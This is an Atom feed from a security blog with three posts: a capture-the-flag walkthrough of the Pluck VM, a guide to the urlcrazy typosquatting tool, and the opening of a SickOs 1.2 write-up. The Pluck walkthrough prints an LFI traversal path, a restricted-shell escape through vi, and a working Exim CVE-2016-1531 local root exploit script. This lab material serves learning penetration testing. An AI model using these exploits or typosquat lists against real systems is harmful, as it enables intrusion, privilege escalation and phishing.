<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-07-06T11:40:31-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Got Pluck?]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/06/got-pluck/"/>
    <updated>2017-07-06T06:28:41-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/06/got-pluck</id>
    <content type="html"><![CDATA[<p>New day, new machine to hack! Today&rsquo;s target is called Pluck.</p>

<!-- more -->


<h2>Recon</h2>

<p>Nmap results:</p>

<p><code>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pluck
3306/tcp open  mysql   MySQL (unauthorized)
5355/tcp open  llmnr?
</code></p>

<p>First order of business, the web server:</p>

<p><img class="center" src="/images/pentest/pluck/pluck.png" title="&lsquo;pluck&rsquo; &lsquo;pluck&rsquo;" ></p>

<p>I ran Nikto on it and it revealed a couple of vulnerabilities:</p>

<p><code>
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-3092: /admin.php: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2017-07-06 09:41:42 (GMT-4) (22 seconds)
</code></p>

<p>First, I went to the admin page and it seems vulnerable to SQL injection:</p>

<p><img class="center" src="/images/pentest/pluck/admin.png" title="&lsquo;admin&rsquo; &lsquo;admin sqli&rsquo;" ></p>

<p>I fired up sqlmap but I couldn&rsquo;t get anything out of the database. Maybe it was a false lead. Next I looked at the LFI vulnerability that Nikto detected and took a peak at <em>/etc/passwd</em>:</p>

<p><code>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:108:65534::/var/lib/lxd/:/bin/false
uuidd:x:109:114::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:112:1::/var/cache/pollinate:/bin/false
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
Debian-exim:x:113:119::/var/spool/exim4:/bin/false
peter:x:1001:1001:,,,:/home/peter:/bin/bash
paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
</code></p>

<p>The last entry is interesting. I used the LFI to look at the script:</p>

<p>```</p>

<h6>#</h6>

<h1>Server Backup script</h1>

<h6>#</h6>

<h1>Backup directories in /backups so we can get it via tftp</h1>

<p>echo &ldquo;Backing up data&rdquo;
tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2&amp; > /dev/null
echo &ldquo;Backup complete&rdquo;
```</p>

<p>A TFTP reference, and I didn&rsquo;t scan for UDP ports. I went back to Nmap real quick:</p>

<p>```
nmap -T4 -sU -p69 192.168.217.147</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-06 09:59 EDT
Nmap scan report for 192.168.217.147
Host is up (0.00016s latency).
PORT   STATE         SERVICE
69/udp open|filtered tftp
```</p>

<p>I got the archive via T<a href="FTP:">FTP:</a></p>

<p><code>
tftp 192.168.217.147
tftp&gt; get /backups/backup.tar
Received 1824718 bytes in 1.4 seconds
</code></p>

<p>Extracted it to find some home directory contents, besides the source for the website:</p>

<p><code>
tar -xvf backup.tar
home/
home/bob/
home/bob/.bashrc
home/bob/.sudo_as_admin_successful
home/bob/.profile
home/bob/.bash_logout
home/paul/
home/paul/keys/
home/paul/keys/id_key3.pub
home/paul/keys/id_key2.pub
home/paul/keys/id_key2
home/paul/keys/id_key4.pub
home/paul/keys/id_key5.pub
home/paul/keys/id_key6
home/paul/keys/id_key1
home/paul/keys/id_key5
home/paul/keys/id_key1.pub
home/paul/keys/id_key6.pub
home/paul/keys/id_key4
home/paul/keys/id_key3
home/paul/.bashrc
home/paul/.profile
home/paul/.bash_logout
home/peter/
home/peter/.bashrc
home/peter/.profile
home/peter/.bash_logout
var/www/html/
var/www/html/fonts/
var/www/html/fonts/glyphicons-halflings-regular.svg
var/www/html/fonts/glyphicons-halflings-regular.woff2
var/www/html/fonts/glyphicons-halflings-regular.ttf
var/www/html/fonts/glyphicons-halflings-regular.woff
var/www/html/fonts/glyphicons-halflings-regular.eot
var/www/html/about.php
var/www/html/index.php
var/www/html/footer.php
var/www/html/css/
var/www/html/css/bootstrap.css.map
var/www/html/css/bootstrap.min.css.map
var/www/html/css/bootstrap-theme.css
var/www/html/css/bootstrap-theme.min.css
var/www/html/css/bootstrap.min.css
var/www/html/css/bootstrap-theme.min.css.map
var/www/html/css/bootstrap-theme.css.map
var/www/html/css/bootstrap.css
var/www/html/header.php
var/www/html/admin.php
var/www/html/js/
var/www/html/js/jquery.min.js
var/www/html/js/bootstrap.js
var/www/html/js/npm.js
var/www/html/js/bootstrap.min.js
</code></p>

<p>Bob&rsquo;s directory:</p>

<p><code>
root@kali:~/home/bob# ls -la
total 20
drwxr-xr-x 2 1000 1000 4096 Jan 18 07:43 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1000 1000  220 Jan 18 00:39 .bash_logout
-rw-r--r-- 1 1000 1000 3771 Jan 18 00:39 .bashrc
-rw-r--r-- 1 1000 1000  655 Jan 18 00:39 .profile
-rw-r--r-- 1 1000 1000    0 Jan 18 03:40 .sudo_as_admin_successful
</code></p>

<p>That sudo file was empty. On to paul:</p>

<p><code>
root@kali:~/home/paul# ls -la
total 24
drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1002 1002  220 Jan 18 03:04 .bash_logout
-rw-r--r-- 1 1002 1002 3771 Jan 18 03:04 .bashrc
drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 keys
-rw-r--r-- 1 1002 1002  655 Jan 18 03:04 .profile
root@kali:~/home/paul# ls -la keys/
total 56
drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 .
drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 ..
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key1
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key1.pub
-rwxrwxr-x 1 1002 1002  672 Jan 18 13:08 id_key2
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key2.pub
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key3
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key3.pub
-rwxrwxr-x 1 1002 1002 1679 Jan 18 13:09 id_key4
-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key4.pub
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key5
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key5.pub
-rwxrwxr-x 1 1002 1002 1675 Jan 18 13:09 id_key6
-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key6.pub
</code></p>

<p>It looks like paul didn&rsquo;t put much effort into securing his SSH keys. Lastly, peter:</p>

<p><code>
root@kali:~/home/peter# ls -la
total 20
drwxr-xr-x 2 1001 1001 4096 Jan 18 03:04 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1001 1001  220 Jan 18 03:04 .bash_logout
-rw-r--r-- 1 1001 1001 3771 Jan 18 03:04 .bashrc
-rw-r--r-- 1 1001 1001  655 Jan 18 03:04 .profile
</code></p>

<h2>Privilege escalation</h2>

<p>Back to paul, and trying those SSH keys. Tried each, the 4th one worked, but it dropped me to this menu:</p>

<p><img class="center" src="/images/pentest/pluck/pdmenu.png" title="&lsquo;pdmenu&rsquo; &lsquo;pdmenu&rsquo;" ></p>

<p>So, what is pdmenu?</p>

<blockquote><p>Pdmenu is a full screen menuing system for Unix. It is designed to be easy to use, and is suitable as a login shell
for inexperienced users, or it can just be ran at the command line as a handy menu.</p></blockquote>

<p>Not much I can do with this, however, the option to edit a file launches vi! I remembered another challenge where vi helped me escape shell restrictions, and found a <a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">SANS article</a> about this exact topic. To get a proper shell, I typed the following in vi&rsquo;s command mode:</p>

<p><code>
:set shell=/bin/bash
:!bash
</code></p>

<p>That dropped me into paul&rsquo;s shell:</p>

<p><code>
paul@pluck:~$ id
uid=1002(paul) gid=1002(paul) groups=1002(paul)
</code></p>

<p>SUID enumeration led me to the next step:</p>

<p><code>
paul@pluck:~$ find / -perm -4000 2&gt;/dev/null
/usr/exim/bin/exim-4.84-7
/usr/bin/passwd
/usr/bin/at
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/s-nail/s-nail-privsep
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/bin/ping
/bin/ntfs-3g
</code></p>

<p>Exim is a MTA similar to sendmail. Googling for an exploit yielded a <a href="https://www.exploit-db.com/exploits/39535/">local root exploit</a>. I used vi to create a shell script with the exploit code, changed it to executable and ran it:</p>

<p>```
paul@pluck:~$ vi rootme.sh
paul@pluck:~$ cat rootme.sh
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm &lt;&lt; EOF
package root;
use strict;
use warnings;</p>

<p>system(&ldquo;/bin/sh&rdquo;);
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</p>

<p>paul@pluck:~$ ./rootme.sh
[ CVE-2016-1531 local root exploit</p>

<h1>whoami</h1>

<p>root
```</p>

<p>The flag is mine!</p>

<p>```</p>

<h1>cat /root/flag.txt</h1>

<p>Congratulations you found the flag</p>

<hr />

<h6>((((((((((((((((((((((((((((((</h6>

<h6>###   (((((((((((((((((((((((((((</h6>

<p>,,##########   ((((((((((((((((((((((((
@@,,,##########   (((((((((((((((((((((
@@@@@,,,##########                   <br/>
@@@@@@@@,,,############################
@@@@@@@@@@@,,,#########################
@@@@@@@@@,,,###########################
@@@@@@,,,##########                  <br/>
@@@,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</p>

<h6>####   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</h6>

<h6>#   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</h6>

<p>```</p>

<p>Interesting twist on this VM with the pdbmenu escape!</p>

<p><strong>Learn more</strong></p>

<ul>
<li><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">escape restricted Linux shells</a></li>
</ul>


<p>```</p>

<hr />

<p>/ Q: How many Zen masters does it take to \
| screw in a light bulb? A: None. The     |
| Universe spins the bulb, and the Zen    |
| master stays out                        |
|                                         |
\ of the way.                             /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[urlcrazy - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/05/urlcrazy-kali-linux-tools/"/>
    <updated>2017-07-05T06:44:07-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/05/urlcrazy-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong> you want to detect possible URL hijacking or phishing of a domain, where unsuspecting users are lured to a malicious domain that is very similar to the original one. urlcrazy ftw!</p>

<p>Homepage: <a href="https://www.morningstarsecurity.com/research/urlcrazy">https://www.morningstarsecurity.com/research/urlcrazy</a></p>

<!-- more -->


<p></p>

<h2>urlcrazy description</h2>

<blockquote><p>Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking,
phishing, and corporate espionage.</p>

<p>Usage</p>

<p>Detect typo squatters profiting from typos on your domain name</p>

<p>Protect your brand by registering popular typos</p>

<p>Identify typo domain names that will receive traffic intended for another domain</p>

<p>Conduct phishing attacks during a penetration test</p>

<p>Features</p>

<p>Generates 15 types of domain variants</p>

<p>Knows over 8000 common misspellings</p>

<p>Supports cosmic ray induced bit flipping</p>

<p>Multiple keyboard layouts (qwerty, azerty, qwertz, dvorak)</p>

<p>Checks if a domain variant is valid</p>

<p>Test if domain variants are in use</p>

<p>Estimate popularity of a domain variant URLCrazy requires Linux and the Ruby interpreter.</p></blockquote>

<h2>urlcrazy options</h2>

<p>```
urlcrazy -h
URLCrazy version 0.5
by Andrew Horton (urbanadventurer)
<a href="http://www.morningstarsecurity.com/research/urlcrazy">http://www.morningstarsecurity.com/research/urlcrazy</a></p>

<p>Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking,
phishing, and corporate espionage.</p>

<p>Supports the following domain variations:
Character omission, character repeat, adjacent character swap, adjacent character replacement, double
character replacement, adjacent character insertion, missing dot, strip dashes, singular or pluralise,
common misspellings, vowel swaps, homophones, bit flipping (cosmic rays), homoglyphs, wrong top level
domain, and wrong second level domain.</p>

<p>Usage: /usr/bin/urlcrazy [options] domain</p>

<p>Options
 -k, &mdash;keyboard=LAYOUT  Options are: qwerty, azerty, qwertz, dvorak (default: qwerty)
 -p, &mdash;popularity   Check domain popularity with Google
 -r, &mdash;no-resolve   Do not resolve DNS
 -i, &mdash;show-invalid Show invalid domain names
 -f, &mdash;format=TYPE  Human readable or CSV (default: human readable)
 -o, &mdash;output=FILE  Output file
 -h, &mdash;help     This help
 -v, &mdash;version      Print version information. This version is 0.5
```</p>

<h2>urlcrazy usage</h2>

<p>```
urlcrazy kali.org
/usr/share/urlcrazy/tld.rb:81: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 81
/usr/share/urlcrazy/tld.rb:89: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 89
/usr/share/urlcrazy/tld.rb:91: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 91
URLCrazy Domain Report
Domain    : kali.org
Keyboard  : qwerty
At        : 2017-07-05 06:57:50 -0400</p>

<h1>Please wait. 63 hostnames to process</h1>

<h2>Typo Type              Typo         DNS-A            CC-A               DNS-MX                                Extn  </h2>

<p>Character Omission     kai.org      111.89.129.15    JP,JAPAN           kai.org                               org <br/>
Character Omission     kal.org      69.172.201.153   US,UNITED STATES                                         org <br/>
Character Omission     kli.org      208.97.188.67    US,UNITED STATES   vade-in2.mail.dreamhost.com           org <br/>
Character Repeat       kaali.org    184.168.221.56   US,UNITED STATES   mailstore1.secureserver.net           org <br/>
Character Repeat       kalii.org                     ?                                                        org <br/>
Character Repeat       kalli.org                     ?                  mail.joker.com                        org <br/>
Character Repeat       kkali.org                     ?                                                        org <br/>
Character Swap         akli.org     180.240.134.81   SG,SINGAPORE       mail.akli.org                         org <br/>
Character Swap         kail.org     185.53.178.9                        mail.h-email.net                      org <br/>
Character Swap         klai.org     74.208.59.167    US,UNITED STATES   mx01.1and1.com                        org <br/>
Character Replacement  jali.org                      ?                  mailin1.totalweb.net.uk               org <br/>
Character Replacement  kaki.org                      ?                                                        org <br/>
Character Replacement  kalo.org     54.214.44.86     US,UNITED STATES   aspmx5.googlemail.com                 org <br/>
Character Replacement  kalu.org     64.85.171.16     US,UNITED STATES   host.rack-host.net                    org <br/>
Character Replacement  ksli.org     203.184.176.168  HK,HONG KONG                                             org <br/>
Character Replacement  lali.org     194.232.43.3     AT,AUSTRIA         dedi3762.your-server.de               org <br/>
Character Insertion    kalio.org    213.186.33.87    FR,FRANCE          mx2.ovh.net                           org <br/>
Character Insertion    kaliu.org    67.205.40.20     US,UNITED STATES   vade-in1.mail.dreamhost.com           org <br/>
Character Insertion    kalki.org    97.74.42.79      US,UNITED STATES   smtp.secureserver.net                 org <br/>
Character Insertion    kasli.org    217.112.35.116   GB,UNITED KINGDOM  mx25.valuehost.ru                     org <br/>
Character Insertion    kjali.org                     ?                                                        org <br/>
Character Insertion    klali.org                     ?                                                        org <br/>
Missing Dot            kaliorg.com                   ?                                                        com <br/>
Missing Dot            wwwkali.org                   ?                                                        org <br/>
Singular or Pluralise  kalis.org    217.160.233.111  DE,GERMANY         mx00.kundenserver.de                  org <br/>
Vowel Swap             kala.org     64.111.125.111   US,UNITED STATES   ASPMX2.GOOGLEMAIL.COM                 org <br/>
Vowel Swap             kale.org     185.53.178.9                        mail.h-email.net                      org <br/>
Vowel Swap             keli.org                      ?                  mail.hti.ag                           org <br/>
Vowel Swap             kili.org     69.172.201.153   US,UNITED STATES                                         org <br/>
Vowel Swap             koli.org     72.52.4.122      US,UNITED STATES   localhost                             org <br/>
Vowel Swap             kuli.org     37.120.172.191   JP,JAPAN           v2.v1.biz                             org <br/>
Homophones             kalaye.org                    ?                                                        org <br/>
Homophones             kaleye.org                    ?                                                        org <br/>
Bit Flipping           cali.org     23.21.169.243    US,UNITED STATES   alt1.aspmx.l.google.com               org <br/>
Bit Flipping           iali.org                      ?                                                        org <br/>
Bit Flipping           kadi.org     146.148.34.125   US,UNITED STATES   mail.hope-mail.com                    org <br/>
Bit Flipping           kahi.org     206.126.4.4      պ,                kahi-org.mail.protection.outlook.com  org <br/>
Bit Flipping           kalh.org     50.63.33.1       E�,                mailstore1.secureserver.net           org <br/>
Bit Flipping           kalk.org     137.74.127.233                                                            org <br/>
Bit Flipping           kalm.org                      ?                  mx.kalm.org.cust.a.hostedemail.com    org <br/>
Bit Flipping           kaly.org     207.148.248.143  US,UNITED STATES                                         org <br/>
Bit Flipping           kami.org     69.172.201.153   ��,                                                      org <br/>
Bit Flipping           kani.org     178.33.20.67     FR,FRANCE          mail.kani.org                         org <br/>
Bit Flipping           kcli.org     50.63.202.44     US,UNITED STATES   ALT1.ASPMX.L.GOOGLE.COM               org <br/>
Bit Flipping           kqli.org                      ?                                                        org <br/>
Bit Flipping           oali.org     184.107.215.202  CA,CANADA          oali.org                              org <br/>
Homoglyphs             ka1i.org                      ?                                                        org <br/>
Homoglyphs             kall.org     65.254.238.128   US,UNITED STATES   mx.kall.org                           org <br/>
Wrong TLD              kali.ca      76.74.246.51     US,UNITED STATES   kali.ca                               ca  <br/>
Wrong TLD              kali.ch      81.221.254.5     CH,SWITZERLAND     kali.ch.2.arsmtp.com                  ch  <br/>
Wrong TLD              kali.com     75.164.208.82    US,UNITED STATES   alt2.aspmx.l.google.com               com <br/>
Wrong TLD              kali.de      193.238.9.165    DE,GERMANY                                               de  <br/>
Wrong TLD              kali.edu                      ?                                                        edu <br/>
Wrong TLD              kali.es      212.227.247.181  DE,GERMANY         mx01.1and1.es                         es  <br/>
Wrong TLD              kali.fr      103.224.182.248                     mx92.mb5p.com                         fr  <br/>
Wrong TLD              kali.it      195.110.124.188  IT,ITALY           mail.register.it                      it  <br/>
Wrong TLD              kali.jp      8.6.19.68        US,UNITED STATES   smtp.secureserver.net                 jp  <br/>
Wrong TLD              kali.net     45.40.165.16                        ASPMX.L.GOOGLE.COM                    net <br/>
Wrong TLD              kali.nl      72.52.4.121      US,UNITED STATES   localhost                             nl  <br/>
Wrong TLD              kali.no      194.63.248.52    NO,NORWAY          mx02.domeneshop.no                    no  <br/>
Wrong TLD              kali.ru      185.53.179.40                                                             ru  <br/>
Wrong TLD              kali.se      92.42.73.20      SE,SWEDEN          kali-se.mail.protection.outlook.com   se  <br/>
Wrong TLD              kali.us      184.168.221.28   US,UNITED STATES   209.150.186.51                        us <br/>
```</p>

<ul>
<li>check domain popularity with no DNS resolution</li>
</ul>


<p>```
urlcrazy -p -r paypal.com
/usr/share/urlcrazy/tld.rb:81: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 81
/usr/share/urlcrazy/tld.rb:89: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 89
/usr/share/urlcrazy/tld.rb:91: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 91
URLCrazy Domain Report
Domain    : paypal.com
Keyboard  : qwerty
At        : 2017-07-05 07:01:52 -0400</p>

<h1>Please wait. 80 hostnames to process</h1>

<h2>Typo Type              Typo           Pop  CC-A  Extn  </h2>

<p>Character Omission     papal.com           ?     com <br/>
Character Omission     payal.com           ?     com <br/>
Character Omission     paypa.com           ?     com <br/>
Character Omission     paypal.cm           ?     cm  <br/>
Character Omission     paypl.com           ?     com <br/>
Character Omission     pypal.com           ?     com <br/>
Character Repeat       paaypal.com         ?     com <br/>
Character Repeat       paypaal.com         ?     com <br/>
Character Repeat       paypall.com         ?     com <br/>
Character Repeat       payppal.com         ?     com <br/>
Character Repeat       payypal.com         ?     com <br/>
Character Repeat       ppaypal.com         ?     com <br/>
Character Swap         apypal.com          ?     com <br/>
Character Swap         papyal.com          ?     com <br/>
Character Swap         payapl.com          ?     com <br/>
Character Swap         paypla.com          ?     com <br/>
Character Swap         pyapal.com          ?     com <br/>
Character Replacement  oaypal.com          ?     com <br/>
Character Replacement  patpal.com          ?     com <br/>
Character Replacement  paupal.com          ?     com <br/>
Character Replacement  payoal.com          ?     com <br/>
Character Replacement  paypak.com          ?     com <br/>
Character Replacement  paypsl.com          ?     com <br/>
Character Replacement  psypal.com          ?     com <br/>
Character Insertion    pasypal.com         ?     com <br/>
Character Insertion    paypalk.com         ?     com <br/>
Character Insertion    paypasl.com         ?     com <br/>
Character Insertion    paypoal.com         ?     com <br/>
Character Insertion    paytpal.com         ?     com <br/>
Character Insertion    payupal.com         ?     com <br/>
Character Insertion    poaypal.com         ?     com <br/>
Missing Dot            paypalcom.com       ?     com <br/>
Missing Dot            wwwpaypal.com       ?     com <br/>
Singular or Pluralise  paypals.com         ?     com <br/>
Vowel Swap             peypel.com          ?     com <br/>
Vowel Swap             piypil.com          ?     com <br/>
Vowel Swap             poypol.com          ?     com <br/>
Vowel Swap             puypul.com          ?     com <br/>
Bit Flipping           0aypal.com          ?     com <br/>
Bit Flipping           pa9pal.com          ?     com <br/>
Bit Flipping           paipal.com          ?     com <br/>
Bit Flipping           paqpal.com          ?     com <br/>
Bit Flipping           paxpal.com          ?     com <br/>
Bit Flipping           pay0al.com          ?     com <br/>
Bit Flipping           paypad.com          ?     com <br/>
Bit Flipping           paypah.com          ?     com <br/>
Bit Flipping           paypam.com          ?     com <br/>
Bit Flipping           paypan.com          ?     com <br/>
Bit Flipping           paypcl.com          ?     com <br/>
Bit Flipping           paypel.com          ?     com <br/>
Bit Flipping           paypil.com          ?     com <br/>
Bit Flipping           paypql.com          ?     com <br/>
Bit Flipping           payqal.com          ?     com <br/>
Bit Flipping           payral.com          ?     com <br/>
Bit Flipping           paytal.com          ?     com <br/>
Bit Flipping           payxal.com          ?     com <br/>
Bit Flipping           pcypal.com          ?     com <br/>
Bit Flipping           peypal.com          ?     com <br/>
Bit Flipping           piypal.com          ?     com <br/>
Bit Flipping           pqypal.com          ?     com <br/>
Bit Flipping           qaypal.com          ?     com <br/>
Bit Flipping           raypal.com          ?     com <br/>
Bit Flipping           taypal.com          ?     com <br/>
Bit Flipping           xaypal.com          ?     com <br/>
Homoglyphs             paypa1.com          ?     com <br/>
Wrong TLD              paypal.ca           ?     ca  <br/>
Wrong TLD              paypal.ch           ?     ch  <br/>
Wrong TLD              paypal.de           ?     de  <br/>
Wrong TLD              paypal.edu          ?     edu <br/>
Wrong TLD              paypal.es           ?     es  <br/>
Wrong TLD              paypal.fr           ?     fr  <br/>
Wrong TLD              paypal.it           ?     it  <br/>
Wrong TLD              paypal.jp           ?     jp  <br/>
Wrong TLD              paypal.net          ?     net <br/>
Wrong TLD              paypal.nl           ?     nl  <br/>
Wrong TLD              paypal.no           ?     no  <br/>
Wrong TLD              paypal.org          ?     org <br/>
Wrong TLD              paypal.ru           ?     ru  <br/>
Wrong TLD              paypal.se           ?     se  <br/>
Wrong TLD              paypal.us           ?     us  <br/>
```</p>

<p>```</p>

<hr />

<p>/ Everything that you know is wrong, but \
\ you can be straightened out.           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SickOs 1.2 writeup]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup/"/>
    <updated>2017-07-03T04:20:13-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is the second machine in the SickOs series. The goal is to obtain the root flag. Target acquired!</p>

<!-- more -->


<p></p>

<p>I did a fast scan with Masscan and discovered that ports 22 and 80 are open. Then I scanned them with Nmap:</p>

<p>```
nmap -T4 -p22,80 -sV 192.168.217.146</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-03 09:11 EDT
Nmap scan report for 192.168.217.146
Host is up (0.00030s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.28
```</p>

<p>The web server serves this pic:</p>

<p><img class="center" src="/images/pentest/sickos/2-blow.jpg" title="&lsquo;web server&rsquo; &lsquo;webpage&rsquo;" ></p>

<p>Nothing in exiftool. I bruteforced the web server, but the only discovery was an empty test directory. I initially overlooked the page source of the picture, until I noticed there is a scroll bar. So I scrolled down to find a comment:</p>

<p>```</p>

<!-- NOTHING IN HERE ///\\\ -->


<blockquote><blockquote><blockquote><p>```</p></blockquote></blockquote></blockquote>

